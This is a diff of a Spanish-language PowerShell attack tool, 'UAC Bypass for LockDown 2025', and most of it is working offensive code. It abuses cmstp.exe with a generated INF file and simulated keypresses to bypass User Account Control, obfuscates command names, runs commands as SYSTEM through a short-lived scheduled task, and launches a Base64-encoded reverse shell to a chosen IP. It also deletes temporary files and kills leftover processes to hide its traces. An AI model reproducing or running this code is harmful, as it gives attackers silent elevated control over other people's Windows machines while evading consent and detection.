@@ -5,33 +5,26 @@ Function SetInfFile($CommandToExecute) {
     $localAppData = [Environment]::GetFolderPath("LocalApplicationData")
     
     if ($CommandToExecute -like "*powershell.exe*" -and $CommandToExecute -notlike "*EncodedCommand*") {
-        # Ofuscación para PowerShell directo
         $obfuscatedCommand = "cmd.exe /c `"set p=power^shell^.exe&call C:\Windows\System32\WindowsPowerShell\v1.0\%%p%`""
     }
     elseif ($CommandToExecute -like "cmd.exe*" -or $CommandToExecute -like "*.exe*") {
-        # Ofuscación para comandos cmd.exe u otros ejecutables
-        # Dividir el comando en partes para ofuscar
         $parts = $CommandToExecute -split " "
         $executable = $parts[0]
         $arguments = $parts[1..($parts.Length-1)] -join " "
         
         if ($executable -eq "cmd.exe") {
-            # Ofuscar cmd.exe y mantener los argumentos
             $obfuscatedCommand = "cmd.exe /c `"set c=cm&set d=d.&set e=exe&call %%c%%%%d%%%%e%% $arguments`""
         }
         else {
-            # Para otros ejecutables, usar técnica de sustitución
             $exeName = [System.IO.Path]::GetFileNameWithoutExtension($executable)
             $exeExt = [System.IO.Path]::GetExtension($executable)
             $obfuscatedCommand = "cmd.exe /c `"set exe=$exeName$exeExt&call %%exe%% $arguments`""
         }
     }
     elseif ($CommandToExecute -like "*EncodedCommand*") {
-        # Para PowerShell con encoded command, no ofuscar para evitar problemas
         $obfuscatedCommand = $CommandToExecute
     }
     else {
-        # Para comandos generales, usar técnica de variables
         $obfuscatedCommand = "cmd.exe /c `"$CommandToExecute`""
     }
     
@@ -59,7 +52,6 @@ ServiceName="LockDown_VPN"
 ShortSvcName="Net_Svc"
 '@.Replace("LINE", $obfuscatedCommand)
 
-    # Generar nombre menos sospechoso
     $randomName = "config_" + (Get-Random -Minimum 10000 -Maximum 99999) + ".tmp"
     $file = Join-Path $localAppData $randomName
     
@@ -68,16 +60,13 @@ ShortSvcName="Net_Svc"
     return $file
 }
 
-# EL RESTO DEL SCRIPT SE MANTIENE EXACTAMENTE IGUAL
 Function Execute-UACBypass($CommandToExecute) {
     $infPath = $null
     try {
         Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
         
-        # Crear archivo INF
         $infPath = SetInfFile($CommandToExecute)
         
-        # Ejecutar cmstp
         Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
         $s = New-Object System.Diagnostics.ProcessStartInfo
         $s.FileName = "cmstp.exe"
@@ -86,12 +75,10 @@ Function Execute-UACBypass($CommandToExecute) {
         $s.WindowStyle = "Hidden"
         [System.Diagnostics.Process]::Start($s) | Out-Null
         
-        # Esperar a que aparezca la ventana UAC (timing variable)
         $waitTime = Get-Random -Minimum 2 -Maximum 4
         Write-Host "[+] Esperando ventana UAC ($waitTime segundos)..." -ForegroundColor Yellow
         Start-Sleep -Seconds $waitTime
-
-        # Cargar funciones de Windows API
+        
         $Win32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -108,7 +95,6 @@ public class Win32
 
         Add-Type $Win32
         
-        # Búsqueda mejorada con múltiples intentos
         Write-Host "[+] Buscando ventana 'LockDown_VPN'..." -ForegroundColor Yellow
         $windowFound = $false
         
@@ -118,7 +104,6 @@ public class Win32
             if ($WindowToFind -ne [IntPtr]::Zero) {
                 Write-Host "[+] Ventana encontrada (intento $($i+1)), enviando ENTER..." -ForegroundColor Green
                 
-                # Enviar ENTER
                 $WM_SYSKEYDOWN = 0x0100;
                 $VK_RETURN = 0x0D;
                 [Win32]::PostMessage($WindowToFind, $WM_SYSKEYDOWN, $VK_RETURN, 0)
@@ -127,7 +112,6 @@ public class Win32
                 break
             }
             
-            # Espera entre intentos
             Start-Sleep -Milliseconds 500
         }
         
@@ -138,7 +122,6 @@ public class Win32
         
         Write-Host "[+] UAC Bypass completado" -ForegroundColor Green
         
-        # Esperar un poco más para que cmstp termine
         Start-Sleep -Seconds 2
         return $true
     }
@@ -147,7 +130,6 @@ public class Win32
         return $false
     }
     finally {
-        # Limpieza del archivo INF
         if ($infPath -and (Test-Path $infPath)) {
             try {
                 Remove-Item $infPath -Force -ErrorAction SilentlyContinue
@@ -155,7 +137,6 @@ public class Win32
             }
             catch {
                 Write-Host "[-] No se pudo eliminar el archivo INF inmediatamente..." -ForegroundColor Yellow
-                # Intentar de nuevo después de esperar
                 Start-Sleep -Seconds 2
                 try {
                     Remove-Item $infPath -Force -ErrorAction SilentlyContinue
@@ -172,13 +153,11 @@ public class Win32
 Function Execute-Command($CommandToExecute) {
     Write-Host "[+] Ejecutando comando: $CommandToExecute" -ForegroundColor Yellow
     
-    # Usar una ruta temporal con mejor compatibilidad
     $tempDir = $env:TEMP
     $randomSuffix = Get-Random -Minimum 10000 -Maximum 99999
     $outputFile = Join-Path $tempDir ("cmdout_$randomSuffix.tmp")
     
     try {
-        # Modificar comando para capturar output de manera más robusta
         $captureCommand = "cmd.exe /c `"$CommandToExecute`" > `"$outputFile`" 2>&1"
         
         Write-Host "[+] Archivo de output temporal: $(Split-Path $outputFile -Leaf)" -ForegroundColor Gray
@@ -189,7 +168,6 @@ Function Execute-Command($CommandToExecute) {
             Write-Host "[+] Comando ejecutado, esperando output..." -ForegroundColor Yellow
             Start-Sleep -Seconds 3
             
-            # Verificar si hay output
             if (Test-Path $outputFile) {
                 try {
                     $outputContent = Get-Content $outputFile -Raw -ErrorAction Stop
@@ -200,7 +178,6 @@ Function Execute-Command($CommandToExecute) {
                     if ([string]::IsNullOrWhiteSpace($outputContent)) {
                         Write-Host "(El comando se ejecutó sin output visible)" -ForegroundColor Gray
                     } else {
-                        # Mostrar el contenido
                         Write-Host $outputContent.Trim()
                     }
                     
@@ -217,7 +194,6 @@ Function Execute-Command($CommandToExecute) {
             Write-Host "[-] El bypass de UAC falló" -ForegroundColor Red
         }
         
-        # Retornar el resultado pero sin imprimirlo
         return $result
     }
     catch {
@@ -225,7 +201,6 @@ Function Execute-Command($CommandToExecute) {
         return $false
     }
     finally {
-        # Limpiar archivo de output si existe
         if (Test-Path $outputFile) {
             try {
                 Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
@@ -237,7 +212,6 @@ Function Execute-Command($CommandToExecute) {
     }
 }
 
-# Función OPTIMIZADA para ejecutar comandos como SYSTEM (un solo UAC bypass)
 Function Execute-CommandAsSystem {
     param(
         [string]$CommandToExecute
@@ -251,7 +225,6 @@ Function Execute-CommandAsSystem {
     $scriptFile = $null
     
     try {
-        # Crear script temporal que ejecutará el comando
         $tempScript = @"
 @echo off
 $CommandToExecute > "$outputFile" 2>&1
@@ -262,7 +235,6 @@ $CommandToExecute > "$outputFile" 2>&1
         
         Write-Host "[+] Creando y ejecutando tarea programada como SYSTEM..." -ForegroundColor Yellow
         
-        # SOLUCIÓN OPTIMIZADA: Un solo comando que hace todo
         $fullCommand = "cmd.exe /c schtasks /create /tn `"$taskName`" /tr `"$scriptFile`" /sc once /st 23:59 /ru SYSTEM /f >nul 2>&1 && schtasks /run /tn `"$taskName`" >nul 2>&1 && timeout /t 2 /nobreak >nul && schtasks /delete /tn `"$taskName`" /f >nul 2>&1"
         
         $result = Execute-Command -CommandToExecute $fullCommand
@@ -270,10 +242,8 @@ $CommandToExecute > "$outputFile" 2>&1
         if ($result) {
             Write-Host "[+] Tarea programada ejecutada como SYSTEM" -ForegroundColor Green
             
-            # Esperar un poco más para asegurar
             Start-Sleep -Seconds 2
             
-            # Leer output si existe
             if (Test-Path $outputFile) {
                 Write-Host "[+] Output del comando (como SYSTEM):" -ForegroundColor Green
                 Write-Host ("=" * 50) -ForegroundColor Cyan
@@ -293,7 +263,6 @@ $CommandToExecute > "$outputFile" 2>&1
             Write-Host "[-] Error al ejecutar la tarea programada" -ForegroundColor Red
         }
         
-        # Retornar el resultado pero sin imprimirlo
         return $result
     }
     catch {
@@ -301,7 +270,6 @@ $CommandToExecute > "$outputFile" 2>&1
         return $false
     }
     finally {
-        # Limpieza de archivos temporales
         if (Test-Path $outputFile) {
             Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
         }
@@ -309,16 +277,13 @@ $CommandToExecute > "$outputFile" 2>&1
             Remove-Item $scriptFile -Force -ErrorAction SilentlyContinue
         }
         
-        # Limpieza adicional de la tarea por si acaso
         try {
             $null = schtasks /delete /tn $taskName /f 2>$null
         } catch {
-            # Ignorar errores
         }
     }
 }
 
-# Función para ejecutar reverse shell con el script PowerShell de Chester
 Function Invoke-PowerShellReverseShell {
     param(
         [string]$IP,
@@ -345,11 +310,9 @@ try {
     };
     `$chester.Close()
 } catch {
-    # Silenciar errores
 }
 "@
 
-    # Codificar el script en Base64 para mayor stealth
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($chesterScript)
     $encodedScript = [Convert]::ToBase64String($bytes)
     
@@ -357,7 +320,6 @@ try {
     
     Write-Host "[+] Ejecutando PowerShell Reverse Shell codificada..." -ForegroundColor Green
     
-    # Para la reverse shell, ejecutamos directamente sin capturar output
     $result = Execute-UACBypass $powerShellCommand
     
     if ($result) {
@@ -368,11 +330,9 @@ try {
         Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
     }
     
-    # Retornar el resultado pero sin imprimirlo
     return $result
 }
 
-# Función principal para reverse shells
 Function Invoke-ReverseShellMenu {
     Write-Host "[+] Configuración de Reverse Shell" -ForegroundColor Cyan
     $ip = Read-Host "Ingresa la IP"
@@ -393,7 +353,6 @@ Function Invoke-ReverseShellMenu {
         Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
     }
     
-    # Retornar el resultado pero sin imprimirlo
     return $result
 }
 
@@ -409,7 +368,6 @@ Function Test-AdminPrivileges {
         Write-Host "[-] NO tienes privilegios de administrador" -ForegroundColor Red
         Write-Host "[-] Usuario: $($identity.Name)" -ForegroundColor Yellow
     }
-    # No retornar valor para evitar que se imprima
 }
 
 Function Invoke-Cleanup {
@@ -441,15 +399,12 @@ Function Invoke-Cleanup {
             }
         }
         catch {
-            # Silenciar errores de limpieza
         }
     }
     
-    # LIMPIEZA MEJORADA DE PROCESOS CMSTP.EXE
     Write-Host "[+] Cerrando procesos cmstp.exe residuales..." -ForegroundColor Yellow
     $processesKilled = 0
     
-    # Método 1: PowerShell nativo
     try {
         $cmstpProcesses = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
         if ($cmstpProcesses) {
@@ -462,7 +417,6 @@ Function Invoke-Cleanup {
         Write-Host "[-] Error con método PowerShell" -ForegroundColor Yellow
     }
     
-    # Método 2: Taskkill por si el método anterior falla
     try {
         Start-Sleep -Milliseconds 500
         $remainingProcesses = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
@@ -484,18 +438,13 @@ Function Invoke-Cleanup {
     }
     
     Write-Host "[+] Limpieza completada ($cleanedCount archivos eliminados, $processesKilled procesos terminados)" -ForegroundColor Green
-    # No retornar valor para evitar que se imprima
 }
 
-# === MENÚ PRINCIPAL MEJORADO ===
 Function Show-MainMenu {
     Clear-Host
     Write-Host "=== UAC Bypass for LockDown 2025 ===" -ForegroundColor Cyan
-    Write-Host "    [PowerShell Reverse Shell Integrada]" -ForegroundColor Green
-    Write-Host "    [Ejecución como SYSTEM disponible]" -ForegroundColor Yellow
     Write-Host ""
 
-    # Verificar privilegios actuales
     Write-Host "[+] Verificando privilegios actuales..." -ForegroundColor Yellow
     $isAlreadyAdmin = Test-AdminPrivileges
 
@@ -516,7 +465,6 @@ Function Show-MainMenu {
     Write-Host ""
 }
 
-# Bucle principal
 do {
     Show-MainMenu
     $opcion = Read-Host "Opción"
